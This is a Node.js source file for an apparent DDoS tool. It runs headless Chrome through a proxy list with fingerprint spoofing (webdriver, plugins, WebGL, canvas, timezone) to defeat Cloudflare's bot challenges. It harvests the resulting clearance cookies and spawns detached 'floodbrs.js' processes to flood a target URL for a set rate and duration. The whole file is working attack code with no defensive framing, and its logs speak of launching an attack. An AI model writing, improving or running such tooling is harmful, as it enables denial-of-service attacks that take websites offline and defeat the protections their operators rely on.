const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    BLUE: '\x1b[34m',
    CYAN: '\x1b[36m',
    RESET: '\x1b[0m'
};

// ========== ENHANCED CLOUDFLARE BYPASS ==========
const bypassFirewall = async (page) => {
    await page.evaluateOnNewDocument(() => {
        // Enhanced anti-detection
        Object.defineProperty(navigator, 'webdriver', { 
            get: () => undefined 
        });
        
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [
                {
                    0: {type: "application/x-google-chrome-pdf"}, 
                    name: "Chrome PDF Plugin", 
                    filename: "internal-pdf-viewer", 
                    description: "Portable Document Format",
                    length: 1
                },
                {
                    0: {type: "application/pdf"}, 
                    name: "Chrome PDF Viewer", 
                    filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", 
                    description: "Portable Document Format",
                    length: 1
                }
            ] 
        });

        Object.defineProperty(navigator, 'languages', { 
            get: () => ['en-US', 'en', 'id-ID', 'id'] 
        });

        // Enhanced Chrome runtime spoofing
        window.chrome = { 
            runtime: {
                connect: () => ({
                    onMessage: { addListener: () => {} }, 
                    postMessage: () => {}, 
                    onDisconnect: { addListener: () => {} }
                }),
                sendMessage: () => {},
                onMessage: { addListener: () => {} },
                onConnect: { addListener: () => {} },
                getManifest: () => ({}),
                id: 'testid',
                getURL: (url) => url,
                reload: () => {}
            }, 
            loadTimes: () => ({
                finishDocumentLoadTime: 0,
                finishLoadTime: 0,
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0,
                navigationType: 'Reload',
                wasFetchedViaSpdy: false,
                wasNpnNegotiated: true,
                npnNegotiatedProtocol: 'h2',
                connectionInfo: 'h2'
            }), 
            csi: () => ({
                onloadT: Date.now(),
                startE: Date.now() - 1000, 
                pageT: 1200,
                tran: 15
            }), 
            app: {
                isInstalled: false,
                InstallState: {
                    DISABLED: 'disabled', 
                    INSTALLED: 'installed', 
                    NOT_INSTALLED: 'not_installed'
                },
                RunningState: {
                    CANNOT_RUN: 'cannot_run', 
                    READY_TO_RUN: 'ready_to_run', 
                    RUNNING: 'running'
                },
                getDetails: () => null,
                getIsInstalled: () => false
            },
            webstore: {
                onInstallStageChanged: {},
                onDownloadProgress: {}
            }
        };
        
        // Enhanced permissions API spoofing
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => {
            if (parameters.name === 'notifications') {
                return Promise.resolve({ state: Notification.permission });
            }
            if (parameters.name === 'geolocation') {
                return Promise.resolve({ state: 'granted' });
            }
            return originalQuery(parameters);
        };

        // Enhanced hardware spoofing
        Object.defineProperty(navigator, 'hardwareConcurrency', { 
            value: Math.floor(Math.random() * 4) + 4 
        });
        Object.defineProperty(navigator, 'deviceMemory', { 
            value: Math.floor(Math.random() * 4) + 4 
        });
        Object.defineProperty(navigator, 'maxTouchPoints', { 
            value: Math.floor(Math.random() * 3) 
        });
        
        // Enhanced document properties
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });
        
        // Enhanced webdriver properties removal
        const propertiesToDelete = [
            '__webdriver_evaluate',
            '__selenium_evaluate', 
            '__webdriver_script_function',
            '__webdriver_script_func',
            '__webdriver_script_fn',
            '__fxdriver_evaluate',
            '__driver_evaluate',
            '__webdriverUnwrapped',
            '__webdriver_script_fn',
            '__lastWatirAlert',
            '__lastWatirConfirm',
            '__lastWatirPrompt',
            '_Selenium_IDE_Recorder',
            '_selenium',
            'callSelenium',
            '_cdc_adoqpoasnfa76pfcZLmcfl_Array',
            '_cdc_adoqpoasnfa76pfcZLmcfl_Promise',
            '_cdc_adoqpoasnfa76pfcZLmcfl_Symbol',
            'callPhantom',
            'callSelenium',
            'phantom',
            'webdriver',
            'selenium',
            '_phantom'
        ];
        
        propertiesToDelete.forEach(property => {
            delete window[property];
        });

        // Enhanced timezone and location spoofing
        Object.defineProperty(Intl.DateTimeFormat.prototype, 'resolvedOptions', {
            value: function() {
                const result = Reflect.apply(Intl.DateTimeFormat.prototype.resolvedOptions, this, arguments);
                result.timeZone = 'Asia/Jakarta';
                return result;
            }
        });

        // Enhanced canvas fingerprint protection
        const originalGetContext = HTMLCanvasElement.prototype.getContext;
        HTMLCanvasElement.prototype.getContext = function(type, attributes) {
            const context = originalGetContext.call(this, type, attributes);
            if (type === '2d') {
                const originalFillText = context.fillText;
                context.fillText = function(...args) {
                    if (args[0] && typeof args[0] === 'string') {
                        args[0] = args[0].replace(/headless/i, '');
                    }
                    return originalFillText.apply(this, args);
                };
            }
            return context;
        };

        // Enhanced WebGL spoofing
        const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) {
                return 'Intel Inc.';
            }
            if (parameter === 37446) {
                return 'Intel Iris OpenGL Engine';
            }
            return originalGetParameter.apply(this, arguments);
        };
    });
};

// ========== ENHANCED BROWSER ARGUMENTS ==========
const getFirewallBypassArgs = () => {
    const baseArgs = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu',
        '--disable-blink-features=AutomationControlled',
        '--disable-infobars',
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-background-timer-throttling',
        '--disable-renderer-backgrounding',
        '--disable-backgrounding-occluded-windows',
        '--disable-ipc-flooding-protection',
        '--disable-features=TranslateUI,BlinkGenPropertyTrees,site-per-process',
        '--enable-features=NetworkService,NetworkServiceInProcess',
        '--ignore-certificate-errors',
        '--ignore-ssl-errors',
        '--disable-web-security',
        '--disable-site-isolation-trials',
        '--disable-component-extensions-with-background-pages',
        '--disable-default-apps',
        '--disable-extensions',
        '--disable-translate',
        '--disable-xss-auditor',
        '--no-pings',
        '--use-gl=swiftshader',
        '--disable-software-rasterizer',
        '--disable-background-networking',
        '--disable-client-side-phishing-detection',
        '--disable-sync',
        '--disable-hang-monitor',
        '--disable-prompt-on-repost',
        '--disable-domain-reliability',
        '--disable-component-update',
        '--aggressive-cache-discard',
        '--max_old_space_size=4096',
        '--disable-back-forward-cache',
        '--disable-partial-raster',
        '--disable-skia-runtime-opts',
        '--disk-cache-size=0',
        '--media-cache-size=0',
        '--disable-features=VizDisplayCompositor',
        '--disable-webrtc-hw-decoding',
        '--disable-webrtc-hw-encoding'
    ];

    // Add random window position and size
    const x = Math.floor(Math.random() * 100);
    const y = Math.floor(Math.random() * 100);
    baseArgs.push(`--window-position=${x},${y}`);
    
    return baseArgs;
};

// ========== ADVANCED CLOUDFLARE SOLVER ==========
const solveCloudflareChallenge = async (page, browserProxy, targetURL) => {
    try {
        coloredLog(COLORS.WHITE, `[SOLVER] Solving Cloudflare: ${maskProxy(browserProxy)}`);
        
        // Wait for page to load completely
        await page.waitForNetworkIdle({ timeout: 15000 }).catch(() => {});
        
        let currentUrl = page.url();
        let title = await page.title().catch(() => '');
        
        // Check if already passed
        if (!title.includes('Just a moment') && !title.includes('Checking your browser') && 
            !title.includes('Verifikasi') && !title.includes('DDoS protection') &&
            !currentUrl.includes('challenge') && !currentUrl.includes('cdn-cgi')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Already passed: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'already_passed' };
        }
        
        coloredLog(COLORS.YELLOW, `[SOLVER] Challenge detected: ${title}`);
        
        // METHOD 1: Wait for automatic redirect (most common)
        coloredLog(COLORS.WHITE, `[SOLVER] Waiting for auto-redirect (20s)`);
        try {
            await page.waitForNavigation({ 
                waitUntil: 'networkidle0',
                timeout: 20000 
            });
            
            currentUrl = page.url();
            title = await page.title().catch(() => '');
            
            if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                coloredLog(COLORS.GREEN, `[SOLVER] Auto-redirect successful`);
                return { solved: true, scenario: 'auto_redirect' };
            }
        } catch (e) {}

        // METHOD 2: Look for and click challenge form buttons
        coloredLog(COLORS.WHITE, `[SOLVER] Looking for challenge buttons`);
        
        // Try multiple selectors for challenge buttons
        const buttonSelectors = [
            'input[type="submit"]',
            'button[type="submit"]',
            '.btn',
            '.button',
            '#challenge-form input[type="submit"]',
            '#challenge-form button',
            'form input[type="submit"]',
            'form button',
            '[class*="challenge"] input[type="submit"]',
            '[class*="challenge"] button',
            '[class*="button"]',
            '[class*="btn"]',
            '[id*="button"]',
            '[id*="btn"]',
            'input[value*="Verify"]',
            'button[onclick*="submit"]',
            '.verify-btn',
            '.success-btn'
        ];

        for (const selector of buttonSelectors) {
            try {
                const button = await page.$(selector);
                if (button) {
                    const isVisible = await button.evaluate(el => {
                        const rect = el.getBoundingClientRect();
                        return rect.width > 0 && rect.height > 0 && 
                               window.getComputedStyle(el).display !== 'none' &&
                               window.getComputedStyle(el).visibility !== 'hidden';
                    }).catch(() => false);
                    
                    if (isVisible) {
                        coloredLog(COLORS.YELLOW, `[SOLVER] Clicking button: ${selector}`);
                        await button.click().catch(() => {});
                        await sleep(10);
                        
                        currentUrl = page.url();
                        title = await page.title().catch(() => '');
                        
                        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                            coloredLog(COLORS.GREEN, `[SOLVER] Button click successful`);
                            return { solved: true, scenario: 'button_click' };
                        }
                    }
                }
            } catch (e) {}
        }

        // METHOD 3: Execute JavaScript challenges
        coloredLog(COLORS.WHITE, `[SOLVER] Executing JavaScript challenges`);
        try {
            // Try to execute common Cloudflare challenge scripts
            const jsResult = await page.evaluate(() => {
                // Look for and trigger JavaScript challenges
                const scripts = document.querySelectorAll('script');
                let executed = false;
                
                scripts.forEach(script => {
                    if (script.textContent.includes('challenge') || 
                        script.textContent.includes('setTimeout') ||
                        script.textContent.includes('document.location') ||
                        script.textContent.includes('window.location') ||
                        script.textContent.includes('form.submit()')) {
                        try {
                            eval(script.textContent);
                            executed = true;
                        } catch (e) {}
                    }
                });
                
                // Trigger form submissions
                const forms = document.querySelectorAll('form');
                forms.forEach(form => {
                    if (form.style.display !== 'none' && form.offsetParent !== null) {
                        try {
                            form.submit();
                            executed = true;
                        } catch (e) {}
                    }
                });
                
                // Click any element with onclick handler
                const clickableElements = document.querySelectorAll('[onclick]');
                clickableElements.forEach(el => {
                    try {
                        el.click();
                        executed = true;
                    } catch (e) {}
                });
                
                return executed;
            });
            
            if (jsResult) {
                coloredLog(COLORS.YELLOW, `[SOLVER] JavaScript executed, waiting for result`);
                await sleep(12);
                
                currentUrl = page.url();
                title = await page.title().catch(() => '');
                
                if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                    coloredLog(COLORS.GREEN, `[SOLVER] JavaScript execution successful`);
                    return { solved: true, scenario: 'javascript_execution' };
                }
            }
        } catch (e) {}

        // METHOD 4: Manual form submission
        coloredLog(COLORS.WHITE, `[SOLVER] Trying manual form submission`);
        try {
            await page.evaluate(() => {
                // Find all forms and submit them
                const forms = document.forms;
                for (let i = 0; i < forms.length; i++) {
                    try {
                        forms[i].submit();
                    } catch (e) {}
                }
                
                // Trigger any Cloudflare specific JavaScript
                if (typeof window === 'object') {
                    // Common Cloudflare challenge variables
                    if (window.cf_chl_opt) {
                        try {
                            window.cf_chl_opt();
                        } catch (e) {}
                    }
                    if (window._cf_chl_enter) {
                        try {
                            window._cf_chl_enter();
                        } catch (e) {}
                    }
                }
            });
            
            await sleep(15);
            
            currentUrl = page.url();
            title = await page.title().catch(() => '');
            
            if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                coloredLog(COLORS.GREEN, `[SOLVER] Manual submission successful`);
                return { solved: true, scenario: 'manual_submission' };
            }
        } catch (e) {}

        // METHOD 5: Reload and retry
        coloredLog(COLORS.WHITE, `[SOLVER] Reloading page with cache bypass`);
        await page.reload({ 
            waitUntil: 'networkidle0',
            timeout: 30000 
        }).catch(() => {});
        
        await sleep(15);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Reload successful`);
            return { solved: true, scenario: 'reload_success' };
        }

        // METHOD 6: Final attempt - extended wait with interaction
        coloredLog(COLORS.WHITE, `[SOLVER] Final attempt - extended wait with interaction (30s)`);
        
        // Simulate human-like behavior
        await page.mouse.move(100, 100);
        await page.mouse.click(100, 100);
        await sleep(2);
        
        // Scroll randomly
        await page.evaluate(() => {
            window.scrollTo(0, Math.random() * 500);
        });
        
        await sleep(25);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Extended wait successful`);
            return { solved: true, scenario: 'extended_wait' };
        }
        
        coloredLog(COLORS.RED, `[SOLVER] Failed to solve challenge`);
        return { solved: false, scenario: 'failed' };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[SOLVER] Error: ${error.message}`);
        return { solved: false, scenario: 'error' };
    }
};

// ========== IMPROVED COOKIES EXTRACTOR ==========
const extractCookies = async (page, targetURL, browserProxy) => {
    try {
        coloredLog(COLORS.WHITE, `[COOKIES] Extracting cookies: ${maskProxy(browserProxy)}`);
        
        // Wait longer for cookies to be set after challenge
        await page.waitForNetworkIdle({ timeout: 15000 }).catch(() => {});
        await sleep(5);
        
        // Get ALL cookies from the browser
        const cookies = await page.cookies().catch(() => []);
        
        if (cookies.length === 0) {
            coloredLog(COLORS.YELLOW, `[COOKIES] No cookies found, trying alternative method`);
            
            // Alternative method: evaluate in browser context
            const browserCookies = await page.evaluate(() => {
                return document.cookie;
            }).catch(() => '');
            
            if (browserCookies && browserCookies.length > 5) {
                coloredLog(COLORS.GREEN, `[COOKIES] Found cookies via document.cookie: ${browserCookies.length} chars`);
                return { 
                    success: true, 
                    cookies: browserCookies, 
                    hasCookies: true,
                    cookieCount: browserCookies.split(';').length
                };
            }
            
            coloredLog(COLORS.RED, `[COOKIES] No cookies available`);
            return { 
                success: false, 
                cookies: '', 
                hasCookies: false,
                cookieCount: 0
            };
        }
        
        // Filter for important Cloudflare cookies
        const cloudflareCookies = cookies.filter(cookie => 
            cookie.name.includes('cf_') || 
            cookie.name.includes('_cf') ||
            cookie.name.toLowerCase().includes('cloudflare') ||
            cookie.name.includes('cf_bm') ||
            cookie.name.includes('__cf') ||
            cookie.name.includes('cf_clearance') ||
            cookie.name.includes('_cfuvid')
        );
        
        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        coloredLog(COLORS.GREEN, `[COOKIES] Found ${cookies.length} total cookies, ${cloudflareCookies.length} Cloudflare cookies`);
        
        // Log important cookies for debugging
        cloudflareCookies.forEach(cookie => {
            coloredLog(COLORS.CYAN, `[COOKIES] ${cookie.name}=${cookie.value.substring(0, 20)}...`);
        });
        
        return { 
            success: true, 
            cookies: cookieString, 
            hasCookies: cookies.length > 0,
            cookieCount: cookies.length,
            cloudflareCookieCount: cloudflareCookies.length
        };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[COOKIES] Error: ${error.message}`);
        return { 
            success: false, 
            cookies: '', 
            hasCookies: false,
            cookieCount: 0,
            cloudflareCookieCount: 0
        };
    }
};

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;
let totalAttempts = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Received Ctrl+C, killing processes...');
    
    exec('taskkill /f /im node.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Error killing node.exe: ${err.message}`);
        }
    });

    exec('taskkill /f /im msedge.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Error killing msedge.exe: ${err.message}`);
        }
    });

    exec('taskkill /f /im chrome.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Error killing chrome.exe: ${err.message}`);
        }
    });

    setTimeout(() => {
        process.exit(0);
    }, 3000);
});

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// Enhanced User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36`
];

// ========== IMPROVED BROWSER LAUNCHER ==========
const launchCloudflareBrowser = async (targetURL, browserProxy, attempt = 1, maxRetries = 3) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=1920,1080',
            `--user-agent=${userAgent}`,
            ...getFirewallBypassArgs()
        ],
        defaultViewport: {
            width: 1920,
            height: 1080,
            deviceScaleFactor: 1,
            isMobile: false,
            hasTouch: false,
            isLandscape: true
        },
        ignoreHTTPSErrors: true,
        timeout: 60000
    };

    try {
        coloredLog(COLORS.YELLOW, `[BROWSER] Starting (Attempt ${attempt}/${maxRetries}): ${maskProxy(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply enhanced bypass
        await bypassFirewall(page);

        // Set extra headers to look more legitimate
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache'
        });

        // Navigate to target with longer timeout
        coloredLog(COLORS.WHITE, `[BROWSER] Navigating to target...`);
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0',
            timeout: 60000 
        }).catch(() => {});

        // Solve Cloudflare challenge
        const challengeResult = await solveCloudflareChallenge(page, browserProxy, targetURL);
        
        if (!challengeResult.solved) {
            throw new Error(`Challenge not solved: ${challengeResult.scenario}`);
        }

        coloredLog(COLORS.GREEN, `[SUCCESS] Challenge solved via ${challengeResult.scenario}`);

        // Extract cookies with improved method
        const cookieResult = await extractCookies(page, targetURL, browserProxy);
        
        if (!cookieResult.success) {
            coloredLog(COLORS.RED, `[COOKIES] Failed to extract cookies`);
            throw new Error('Cookie extraction failed');
        }
        
        if (cookieResult.hasCookies) {
            coloredLog(COLORS.GREEN, `[COOKIES] Success! Got ${cookieResult.cookieCount} cookies (${cookieResult.cloudflareCookieCount} Cloudflare)`);
        } else {
            coloredLog(COLORS.YELLOW, `[COOKIES] No cookies found, but continuing attack`);
        }
        
        totalSolves++;

        await browser.close();
        return { 
            cookies: cookieResult.cookies || '', 
            userAgent,
            scenario: challengeResult.scenario,
            hasCookies: cookieResult.hasCookies,
            cookieCount: cookieResult.cookieCount,
            cloudflareCookieCount: cookieResult.cloudflareCookieCount
        };
        
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        if (attempt < maxRetries) {
            coloredLog(COLORS.YELLOW, `[RETRY] Retrying... (${attempt}/${maxRetries}): ${maskProxy(browserProxy)} - ${error.message}`);
            await sleep(5);
            return launchCloudflareBrowser(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        coloredLog(COLORS.RED, `[FAILED] All attempts failed: ${maskProxy(browserProxy)} - ${error.message}`);
        return null;
    }
};

// FLOOD PROCESS LAUNCHER
const launchFloodProcess = async (cookies, userAgent, browserProxy) => {
    try {
        coloredLog(COLORS.YELLOW, `[FLOOD] Launching: ${maskProxy(browserProxy)}`);
        
        const floodProcess = spawn('node', [
            'floodbrs.js',
            targetURL,
            duration.toString(),
            rate,
            '1',
            proxyFile,
            cookies || '',
            userAgent || randomElement(userAgents),
            validKey
        ], {
            detached: true,
            stdio: 'ignore'
        });

        floodProcess.unref();
        return true;
        
    } catch (error) {
        coloredLog(COLORS.RED, `[FLOOD] Launch error: ${error.message}`);
        return false;
    }
};

// THREAD HANDLER
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        coloredLog(COLORS.RED, `[THREAD] Max retries: ${maskProxy(browserProxy)}`);
        done(null, { task });
        return;
    }

    try {
        const cloudflareData = await launchCloudflareBrowser(targetURL, browserProxy);
        
        if (cloudflareData) {
            const floodLaunched = await launchFloodProcess(
                cloudflareData.cookies, 
                cloudflareData.userAgent, 
                browserProxy
            );
            
            if (floodLaunched) {
                coloredLog(COLORS.GREEN, `[SUCCESS] Attack launched: ${maskProxy(browserProxy)}`);
            }
        }
        
        done(null, { task });
        
    } catch (error) {
        coloredLog(COLORS.RED, `[THREAD] Attempt failed: ${error.message}`);
        await sleep(5);
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// QUEUE SETUP
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, 1);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[COMPLETE] All proxies processed');
});

// MAIN EXECUTION
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[ERROR] No proxies found');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[START] Cloudflare solver with ${proxies.length} proxies`);

    proxies.forEach(browserProxy => queue.push({ browserProxy }));

    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[CLEANUP] Time completed');
        queue.kill();
        
        exec('pkill -f floodbrs.js', () => {});
        exec('pkill -f chrome', () => {});

        setTimeout(() => {
            coloredLog(COLORS.GREEN, '[SHUTDOWN] Mission complete');
            process.exit(0);
        }, 3000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => {
    coloredLog(COLORS.RED, `[CRASH] ${error.message}`);
});
process.on('unhandledRejection', (error) => {
    coloredLog(COLORS.RED, `[REJECTION] ${error.message}`);
});

coloredLog(COLORS.GREEN, '[READY] 🛡️ ENHANCED CLOUDFLARE SOLVER ACTIVATED 🛡️');
main().catch(err => {
    coloredLog(COLORS.RED, `[MAIN ERROR] ${err.message}`);
    process.exit(1);
});
